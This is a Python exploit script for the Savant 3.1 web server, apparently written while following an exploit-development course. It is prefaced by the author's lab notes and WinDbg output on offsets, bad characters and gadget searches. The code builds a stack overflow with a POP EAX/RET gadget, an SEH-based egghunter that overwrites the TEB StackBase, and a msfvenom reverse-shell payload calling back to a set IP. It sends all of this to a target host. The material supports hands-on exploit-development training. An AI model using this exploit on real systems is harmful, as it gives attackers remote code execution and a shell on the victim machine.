"""
OMER: Generated this template for following along on Ch6

> Could try on my own to figure out how big of a payload i can send before it crashes


> Found out this is the max that triggers an AV on, but the EIP wasnt overwrittenFound out this is the max that triggers an AV on, but the EIP wasnt overwritten

> exchain isnt being overwritten, cant increase overwrite size either
!exchain
04aaff60: Savant+18468 (00418468)
04aaffcc: ntdll!_except_handler4+0 (76f58dd0)
04aaffe4: ntdll!FinalExceptionHandlePad60+0 (76f6672c)


> signs of SEH taking over?
0:005> dd esp
0265ea1c 00414141 0265ea74 0041703c 019157b0
0265ea2c 019157b0 00000000 00000000 00000000
0265ea3c 00000000 00000000 00000000 00000000
0265ea4c 00000000 00000000 00000000 00000000
0265ea5c 00000000 00000000 00000000 00000000
0265ea6c 00000000 00000002 00544547 00000000
0265ea7c 00000000 00000000 00000000 00000000
0265ea8c 4141412f 41414141 41414141 41414141

00414141 <- didnt notice this at first, but from the book i
            saw that this is null terminated cause of the 0's.
            i thought it was something else overwriting what
            im sending

book glossed over this since its not a viable path here
but it is possible to indirect jump to register and redirect exec flow
done by checking whats stored in which reg and then
`JMP/CALL reg` kind of already done with PPR

> 04baea20 04baea74 <- looks like its pointing somewhere close,
                       confirmed visually as well
0:005> dds esp
04baea1c 00414141 Savant+0x14141
04baea20 04baea74
04baea24 0041703c Savant+0x1703c
04baea28 001f57b0
04baea2c 001f57b0
04baea30 00000000
04baea34 00000000

> Using dc poi(esp+4), we can access the entire GET string used for the overflow
> Need a JMP command to jump me to dc poi(esp+4)
> offset found to be at 0x116

masf_nasm to jmp command in EIP
E911010000, this is way too long of an instruction

> found bad chars 0x00, 0x0A, 0x0D, 0x25
note, have not bothered with finding the offset yet
same goes for finding a suitable PPR lib as well as the offset

> gonna try to look for the offset, see how the URL is in memory
0040c05f -< offset
mangled, something intervened
attempt to find by bytes

> found! offset of 253
? why was the pattern fucked with
? null termination didnt trigger for 41's and 42's but
  triggers for the msf pattern


> what now?
recall.
    - ESP is malformed, cant jump since 9090 cant be loaded into the higher bytes due to the string routine adding a null char
        - need to figure out if i can hijack that routine
        - NOTE that i can still use something to JMP me 127 bytes front or back since i have EIP
    - found bad chars [0, a, d, 25]h
    - found offset @253, 4 bytes get loaded into EIP at offset of 253
    - esp+4 during the crash holds `GET /` + shellcode
    ! check if a pattern of 257 is screwed as well
        ? 257 checks out. idk why it fked with the pattern at 260


> Found a Application-Specific addresses for the running exe, however they are fully ass as it ends with a null byte &
additionally no other module is compiled with protections off

0:010> !nmod
00400000 00452000 Savant               /SafeSEH OFF

> giant PITA, need further thinking on this, have to manipulate the flow more precisely
0:005> u poi(esp + 4)
04a5ea74 47              inc     edi
04a5ea75 45              inc     ebp
04a5ea76 54              push    esp
04a5ea77 0000            add     byte ptr [eax],al
04a5ea79 0000            add     byte ptr [eax],al
04a5ea7b 0000            add     byte ptr [eax],al
04a5ea7d 0000            add     byte ptr [eax],al
04a5ea7f 0000            add     byte ptr [eax],al
0:005> u poi(esp)
04a5fe60 e8030000c0      call    c4a5fe68
04a5fe65 58              pop     eax
04a5fe66 ba01004000      mov     edx,offset Savant+0x1 (00400001)
04a5fe6b 003404          add     byte ptr [esp+eax],dh
04a5fe6e 0000            add     byte ptr [eax],al
04a5fe70 0200            add     al,byte ptr [eax]
04a5fe72 9b              wait
04a5fe73 7ac0            jp      04a5fe35
0:005> u esp
04a5ea1c 60              pushad
04a5ea1d fe              ???
04a5ea1e a5              movs    dword ptr es:[edi],dword ptr [esi]
04a5ea1f 0474            add     al,74h
04a5ea21 eaa5043c704100  jmp     0041:703C04A5
04a5ea28 b057            mov     al,57h
04a5ea2a ba01b057ba      mov     edx,0BA57B001h
04a5ea2f 0100            add     dword ptr [eax],eax


brute force but game plan, at least in a simple way, would be to get EIP to esp+4. after which our buffer can be run
the 47,45,54 is ASCII for GET but the EIP will read it as instructions for the CPU. save it for later, get to esp+4 first

for that i just need to pop the stack.

only way to do that is to find a pop instruction in the shit exe and return

┌──(kali㉿kali)-[~/Desktop/savant_3_1]
└─$ msf-nasm_shell
nasm > pop
/tmp/nasmXXXX20260102-162451-oc0kad:2: error: invalid combination of opcode and operands
Error: Assembler did not complete successfully: 1
nasm > pop eax
00000000  58                pop eax
nasm > ret
00000000  C3                ret


> okay so we'll look for 58 following by a C3 in the dll
s -b 00400000 00452000 58 C3

0:005> s -b 00400000 00452000 58 C3
00418674  58 c3 33 c0 c3 55 8b ec-51 51 83 7d 08 00 ff 75  X.3..U..QQ.}...u
0041924f  58 c3 a1 68 a2 44 00 56-83 f8 03 57 75 66 53 33  X..h.D.V...WufS3
004194f6  58 c3 33 c0 c3 a1 68 a2-44 00 83 f8 03 75 06 a1  X.3...h.D....u..
00419613  58 c3 a1 4c a2 44 00 8d-0c 80 a1 50 a2 44 00 8d  X..L.D.....P.D..
0041a531  58 c3 33 c0 c3 83 3d 68-ae 43 00 ff 53 55 56 57  X.3...=h.C..SUVW
0041af7f  58 c3 8b 65 e8 33 db 33-f6 83 4d fc ff 3b f3 74  X..e.3.3..M..;.t
0041b464  58 c3 33 c0 c3 55 8b ec-83 ec 0c 8b 45 0c 53 56  X.3..U......E.SV
0041b9fa  58 c3 33 c0 c3 0f b6 44-24 04 8a 4c 24 0c 84 88  X.3....D$..L$...
0041ba2e  58 c3 55 8b ec 83 ec 18-53 56 57 6a 19 e8 b6 f3  X.U.....SVWj....
0041c49a  58 c3 e8 c6 b9 ff ff 83-c0 54 c3 55 8b ec 81 ec  X........T.U....
0041cc30  58 c3 8b 65 e8 33 ff 89-7d dc 83 4d fc ff 8b 5d  X..e.3..}..M...]
0041cce4  58 c3 8b 65 e8 33 ff 33-db 83 4d fc ff 8b 75 d8  X..e.3.3..M...u.
0041eb74  58 c3 33 c0 c3 55 8b ec-83 ec 78 8d 45 88 6a 78  X.3..U....x.E.jx
0041fe21  58 c3 8b 65 e8 33 ff 89-7d d4 83 4d fc ff 8b 75  X..e.3..}..M...u
0041fe7e  58 c3 8b 65 e8 33 ff 33-db 83 4d fc ff 3b df 74  X..e.3.3..M..;.t
00420904  58 c3 8b 65 e8 33 ff 33-f6 83 4d fc ff 3b f7 74  X..e.3.3..M..;.t
00420a1d  58 c3 8b 65 e8 33 f6 33-ff 83 4d fc ff 3b fe 74  X..e.3.3..M..;.t
00420e69  58 c3 8b 65 e8 33 db 89-5d dc 83 4d fc ff 8b 75  X..e.3..]..M...u
00420ed8  58 c3 8b 65 e8 33 db 33-ff 83 4d fc ff 8b 75 e0  X..e.3.3..M...u.

0:005> u 00418674
Savant+0x18674:
00418674 58              pop     eax
00418675 c3              ret

good enough, even better cause we can cut off the null bytes and have the program add it for us later

> worked but the final instruction triggered final exception
(e78.a88): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0496fe60 ebx=001e57b0 ecx=0000000e edx=76f43060 esi=001e57b0 edi=0041703d
eip=0496ea8b esp=0496ea20 ebp=41414142 iopl=0         ov up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010a82
0496ea8b 002f            add     byte ptr [edi],ch          ds:0023:004

what now lol


> glossed over the book a little, have to jump over that ass instruction somehow.
NOTE only reason its bad is because 2f is ascii for /

the book used the idea of messsing with the buffer used to store the HTTP method

> Tried a few combinations, what worked for me was to push the GET method further closer
to the / char. looks like i can +16 the initalBuffer


0:005> dc poi(esp+4)
048eea74  35343534 35343534 00544547 00000000  45454545GET.....
048eea84  00000000 00000000 4141412f 41414141  ......../AAAAAAA
048eea94  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
048eeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA



> got it, buffer length of 20
0:005> dc poi(esp+4)
0499ea74  35343534 35343534 35343534 35343534  4545454545454545
0499ea84  35343534 00544547 4141412f 41414141  4545GET./AAAAAAA
0499ea94  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0499eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA

jmp nasm > jmp $+4
00000000  EB02              jmp 0x4
^will add this to the final 8 bytes right before "GET /", so i
can jump to a clean set of AAAA's


5jan_253p
> dumbo, just do a bigger jmp right at the start, ignore the header

5jan_329p
> using JE
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx
nasm > test ecx, ecx
00000000  85C9              test ecx,ecx
nasm > je 0x17
00000000  0F8411000000      jz 0x17

5jan_402p
> worked, got to jump over the sus 2f, only have 250ish bytes for payload however. need
an egghunter

5jan_415p
> Did a weird thing with the way the request is now structured but i got the address
0:005> s -a 0x0 L?80000000 w00tw00t
005859cd  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD

-a means ascii string

6jan_126p
> as far as the request is concerned, basically a CRLF is sent in-situ of the GET Request
this will trigger the header parser to run and stop after our CRLF is seen. after which
the URI parser starts and triggers our AV

well since we have a marked segment incode, whats stopping me from sending an egghunter?


6jan_158p
> nothing is happening, not even page violations. maybe the egghunter was bad?
checking the book

6jan_224p
following the book
- found my tagged code, not in curStack however.

0:005> !address 018c59cd
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
*** Unable to resolve unqualified symbol in Bp expression 'x00418674'.
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  Heap
Base Address:           018c0000
End Address:            018cf000
Region Size:            0000f000 (  60.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        018c0000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap -s -h 0x18c0000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x18c59cd


Content source: 1 (target), length: 9633


7jan_433p: been a lot of back and forth, didnt log shit.
wrote nasm_module, reverse_module which needs to be completed tommorow
nasm_module now lets me write asm inline to python, no need to worry about copy pasting
will help with egghunter and other small asm needed

reverseshell module will also do the same, letting me choose modules as needed

8jan_1202p: Got a revShell, both modules are working as expected.
NOTE:: need a better way to parse syscalls online + if a null byte is detected then add a NEG instruct after inverting the syscall

8jan_1224p: Testing the syscall finder, it will return a flag if byte needs to be inverted

8jan_241p: seems like the automated syscall finding tech wasnt useful, book implements
            an seh based egghunter

            it overrides the SEH and installs its own egghunter code therefore
            every AccessViolation (AV) or GuardPageViolation(GPV) triggers the
            egghunter to look into the next page

            a AV/GPV would mean that an invalid memory page was accessed,
            have to restore flow to a point where we can switch into a new page
            and iterate over the addresses again

            `repe scasd` repeat until equal, scan a string (double)
            repe will repeat scasd depending on whats stored in ECX
            scasd searches for string stored in EDX

            repe scasd is the triggerpoint for an AV/GVP

8jan_435p: got the shellcode to work but the way SEH works isnt updated
CFG interupted me

8jan_438p: cardinal sin ngl but im skipping to running the code first
tired of following an example just to be hit w a curveball, understand it
later. the general gist is that build_exception_record needs an extra line or
two

to summarize, to reach the rtlisvalidhandle call, we have to pass the following checks:
1. The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be
higher than the StackLimit.
2. The memory address of our _EXCEPTION_REGISTRATION_RECORD structure plus 0x08
needs to be lower than the StackBase.
3. The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be
aligned to the four bytes boundary.
4. The memory address of our _except_handler function needs to be located at a higher
address than the StackBase.

all checks are passed minus the last one, which checks that execHandler has to be above
stackbase

this is done by
    sub ecx, 0x04                       ; adjusts the handler pointer downward so it can pass the StackBase validation.
    add ebx, 0x04                       ; changes the TEB offset from 0 (ExceptionList) to 4 (StackBase).
    mov dword ptr fs:[ebx], ecx         ; overwrites stackbase with -4 execHandler
which ensures that ebx holds the next value and the stackbase is lower than execHandler

why? cause OUR exec handler does exist within the stack and so we set stackBase to -4 than the execHandler
itll be the first thing executeable within the stack and whatever is forward will be accessible as well

-4 since the rest of the code can be affected + registers


"""

import socket
import sys
import struct
from keystone_module import keystone_asm
from nasm_module import nasm_asm
from msfvenom_module import generateShellcode
from colorama import Fore, Back, Style

from syscallFinder_module import get_syscall_number


def send_crash(server, port):
    size = 260  # Triggered AV, EIP corrupted(barely)

    # 5jan_238p: Need to get into a habit of timestamping my comments + making a memory map of whats going on
    # MEM_MAP -> Buffer unusually long for HTTP method + buffer overflow available for the GET URL
    # 20 bytes
    print(f"{Fore.RED}[+] Setting up methodBuffer{Style.RESET_ALL}")
    methodBuffer = b""
    methodBuffer += nasm_asm("XOR ECX, ECX", debug=True)
    methodBuffer += nasm_asm("TEST ECX, ECX", debug=True)
    methodBuffer += nasm_asm("JZ 0x17", debug=True)
    methodBuffer += b" /"

    # 8jan_1224p: Need to get syscall value for win10 22h2. NtAccessCheckAndAuditAlarm
    syscallNumber, source, needs_invert = get_syscall_number(
        "NtAccessCheckAndAuditAlarm", "Windows 10", "22H2", "x86"
    )

    # 6jan_139p: passing egghunter before POP EAX, RET
    # 6jan_149: encountered misalignment since the jmp isnt exact
    print(f"{Fore.RED}[+] Setting up egghunter{Style.RESET_ALL}")
    egghunterPayload = b""
    egghunterPayload += b"\x90" * 8
    egghunterCode = f""" 
    start:                                  ; (1) 
        jmp get_seh_addr                    ; JMP to negative call to get egghunter pos

    build_exception_record:                 ; (3) 
        pop ecx                             ; ECX = address of next instruction (points to the handler code: mov eax, 0x74303077...)
        mov eax, 0x74303077                 ; EAX = egg marker 'w00t' 
        push ecx                            ; ExceptionRegistrationRecord.Handler = address of handler (points just after the egg load)
        push 0xFFFFFFFF                     ; ExceptionRegistrationRecord.Next = -1 (end of chain)
        xor ebx, ebx                        ; EBX = 0 (starting search address)
        mov dword ptr fs:[EBX], esp         ; Install our custom SEH record at the head of the TEB SEH chain (fs:[0])
        ; 8jan_439p: --- Added lines ---
        sub ecx, 0x04                       ; sub 0x04 from pointer to exception handler
        add ebx, 0x04                       ; add 0x04 to ebx
        mov dword ptr fs:[ebx], ecx         ; overwrites stackbase with -4 execHandler
    is_egg:                                 ; (4) 
        push 0x02                           ; Push 0x2. Loop setup
        pop ecx                             ; ECX = 0x2 from stack
        mov edi, ebx                        ; EDI = current candidate address to check
        repe scasd                          ; Compare [EDI] with EAX ('w00t'), increment EDI by 4, repeat twice; ZF=1 if both match
        jnz loop_inc_one                    ; If no full egg match, go increment by 1 byte and retry
        jmp edi                             ; Full egg found! EDI points to the address *after* the second egg → jump to real payload

    loop_inc_page:                          ; (6) 
        or bx, 0xFFFF                       ; Align EBX to the end of the current page (BX = 0xFFFF)

    loop_inc_one:                           ; (5) 
        inc ebx                             ; Move to next byte address
        jmp is_egg                          ; Check for egg at new position

    get_seh_addr:                           ; (2) 
        call build_exception_record         ; Call back to setup SEH; return address points just after egg load (handler entry)

        ; --- Exception handler code (executed when access violation occurs) ---
        push 0x0c                           ; (7) Offset to ContextRecord in EXCEPTION_POINTERS structure
        pop ecx                             ; ECX = 0x0C
        mov eax, [esp+ecx]                  ; EAX = pointer to CONTEXT record (from EXCEPTION_POINTERS)
        mov cl, 0xb8                        ; ECX low byte = 0xB8 (offset of Eip in CONTEXT structure)
        add dword ptr ds:[eax+ecx], 0x06    ; Increment CONTEXT.Eip by 6 bytes → skip over the invalid access instruction and point to loop_inc_page
        pop eax                             ; Restore original return address (clean stack / prepare for ret)
        add esp, 0x10                       ; Clean up the stacked EXCEPTION_POINTERS and exception record pointers
        push eax                            ; Push back the original return address
        xor eax, eax                        ; EAX = 0 (STATUS_CONTINUE_EXECUTION)
        ret                                 ; Return to OS exception dispatcher → resume at patched Eip (loop_inc_page)
    """
    # egghunterPayload += nasm_asm(egghunterCode, debug=True)
    egghunterPayload += keystone_asm(egghunterCode, debug=True)
    egghunterPayload += b"\x41" * (253 - len(egghunterPayload))

    payload = b""
    payload += egghunterPayload
    payload += b"\x74\x86\x41"  # 0x00418674: location of POP EAX, RET

    # 5jan_412p: Not sure why but the book added a rnrn here [UDPATE, check 6jan_126p]
    payload += b"\r\n" * 2

    # 6jan_139p: tagging shellcode and sending it to the program.
    print(f"{Fore.RED}[+] Setting up shellcode{Style.RESET_ALL}")
    shellCode = generateShellcode(
        LHOST="192.168.3.135",
        payload="windows/shell_reverse_tcp",
        LPORT=443,
        debug=True,
    )
    payload += b"w00tw00t"
    payload += shellCode

    # Compile into final buffer
    buffer = b""
    buffer += methodBuffer
    buffer += payload
    buffer += b"\r\n\r\n"

    # Diagnostics
    print(f"\n\n{Fore.MAGENTA}[!] Payload ready, sending now")
    print(
        f"{Fore.RED}[+] Sending methodBuffer: \n{Fore.LIGHTGREEN_EX}{methodBuffer}{Style.RESET_ALL}"
    )
    print(
        f"{Fore.RED}[+] Sending Payload: \n{Fore.LIGHTGREEN_EX}{payload}{Style.RESET_ALL}"
    )
    print(
        f"{Fore.RED}[+] methodBuffer Length: {Fore.LIGHTGREEN_EX}{len(methodBuffer)}{Style.RESET_ALL}"
    )
    print(
        f"{Fore.RED}[+] Payload Length: {Fore.LIGHTGREEN_EX}{len(payload)}/260{Style.RESET_ALL}"
    )
    print(
        f"{Fore.RED}[+] shellCode Length: {Fore.LIGHTGREEN_EX}{len(shellCode)}/400{Style.RESET_ALL}"
    )

    # Send buffer to the host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()


if __name__ == "__main__":
    try:
        server = sys.argv[1]
        port = 80
        send_crash(server=server, port=port)

        print(f"\n{Fore.LIGHTGREEN_EX}[!] Done!\n{Style.RESET_ALL}")
    except Exception as e:
        print(e)
